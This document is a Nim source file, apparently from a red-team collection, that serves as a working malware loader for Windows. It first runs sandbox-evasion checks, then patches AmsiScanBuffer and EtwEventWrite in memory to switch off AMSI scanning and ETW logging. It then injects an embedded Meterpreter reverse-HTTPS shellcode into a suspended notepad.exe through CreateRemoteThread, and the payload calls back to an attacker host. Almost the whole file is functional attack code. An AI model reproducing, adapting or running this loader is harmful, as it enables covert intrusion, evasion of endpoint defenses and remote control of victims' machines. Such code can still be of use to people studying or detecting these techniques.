#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim
]#

# CreateRemoteThread in Notepad using easy to use high level APIs


import winim/lean
import osproc
import dynlib
import strenc # add a bit more of obfuscation for embedded strings
import random
import times
import os
import strformat

proc WeirdApi(): bool =
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000,
        0x20,
        0
    )
    if isNil(mem):
        return false
    else:
        return true

proc SleepnCheck(): bool =
    randomize()
    let dreaming = rand(5000..10000)
    let delta = dreaming - 500
    let before = now()
    sleep(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true


proc MetaSandbox(): bool =
    if SleepnCheck() == false:
        return false
    elif WeirdApi() == false:
        return false
    else:
        return true

proc Patchntdll(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc PatchAmsi(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =


    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"


when defined(windows):

    when defined amd64:
        echo "[*] Running in x64 process"
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 EXITFUNC=thread -f csharp
        var shellcode: array[680, byte] = [byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
        0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x4d,0x31,0xc9,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
        0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
        0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
        0x41,0x58,0x5e,0x48,0x01,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
        0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
        0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
        0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
        0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
        0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x35,0x36,
        0x2e,0x31,0x30,0x31,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,
        0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
        0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x7d,0x00,0x00,0x00,0x2f,0x45,0x4f,0x75,
        0x72,0x59,0x54,0x50,0x47,0x42,0x44,0x70,0x7a,0x75,0x58,0x4b,0x37,0x45,0x6b,
        0x61,0x63,0x43,0x41,0x48,0x51,0x62,0x58,0x38,0x57,0x58,0x4e,0x74,0x38,0x55,
        0x79,0x75,0x75,0x62,0x4e,0x49,0x4d,0x36,0x51,0x6a,0x44,0x67,0x43,0x58,0x62,
        0x41,0x4d,0x53,0x73,0x78,0x6f,0x73,0x4c,0x51,0x30,0x55,0x5a,0x61,0x6f,0x50,
        0x43,0x56,0x56,0x39,0x46,0x30,0x58,0x36,0x6e,0x4c,0x4f,0x79,0x6d,0x5f,0x39,
        0x62,0x56,0x70,0x37,0x77,0x4b,0x6b,0x70,0x6f,0x72,0x43,0x4b,0x6b,0x6f,0x57,
        0x38,0x30,0x4c,0x4c,0x68,0x55,0x5f,0x37,0x6e,0x49,0x72,0x54,0x32,0x6a,0x55,
        0x6c,0x5f,0x6b,0x6c,0x41,0x77,0x64,0x6c,0x62,0x46,0x65,0x56,0x69,0x77,0x54,
        0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
        0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
        0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
        0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,
        0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
        0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
        0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
        0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
        0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
        0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
        0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
        0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
        0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
        0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
        0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,
        0x41,0x89,0xda,0xff,0xd5]
    elif defined i386:
        discard

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        if MetaSandbox() == false:
            quit()
        var amsi_success = PatchAmsi()
        echo fmt"[*] AMSI disabled: {bool(amsi_success)}"
        var etw_success = Patchntdll()
        echo fmt"[*] ETW blocked by patch: {bool(etw_success)}"
        injectCreateRemoteThread(shellcode)